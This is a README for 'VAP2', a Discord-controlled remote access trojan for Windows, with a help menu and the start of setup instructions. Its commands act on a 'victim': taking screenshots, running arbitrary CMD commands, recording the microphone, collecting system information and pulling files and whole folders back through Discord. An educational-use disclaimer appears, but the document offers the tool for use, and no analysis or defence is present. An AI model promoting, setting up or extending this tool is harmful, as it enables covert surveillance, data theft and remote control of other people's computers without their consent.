# 💨 vapoursssmalwarewindows

**Version:** vap~2  
**Codename:** VAP2  
**Platform:** Windows  
**Author:** VAPOURSSS

---

## 🧠 Overview

`VAP-WINDOWS-2.0` (VAP2) is a Discord-based remote administration tool (RAT) built for ethical testing, educational use, and secure environments. It offers various surveillance and command-execution features through Discord bot commands — all done remotely.

> ⚠️ **Disclaimer**: This tool is strictly for **educational purposes** and **authorized use** only. Misuse can be illegal. The author assumes **no responsibility** for misuse or damages.

---

## 📜 VAP2 HELP MENU

| **Command**                        | **Usage Description**                                                                 |
|-----------------------------------|----------------------------------------------------------------------------------------|
| `screenshot`                      | Takes a screenshot of the victim’s screen and sends it back.                          |
| `run <command>`                   | Executes Windows CMD commands remotely.                                               |
| `sysinfo`                         | Returns a text file with system information (IP, specs, OS, etc.).                    |
| `shutdown`                        | Shuts down the victim’s machine.                                                      |
| `capture-audio <duration>`        | Records audio from the victim's microphone for `<duration>` seconds and returns `.avi`.|
| `grab-file <file-path>`           | Retrieves a file from the victim’s system.                                            |
| `grab-folder <folder-path>`      | Returns all files from the specified folder.                                          |
| `help-tool`                       | Displays this help menu.                                                              |

---

## 🛠 Setup

1. **Clone the repository:**
   ```bash
   git clone https://github.com/haider1928/vap-windows.git
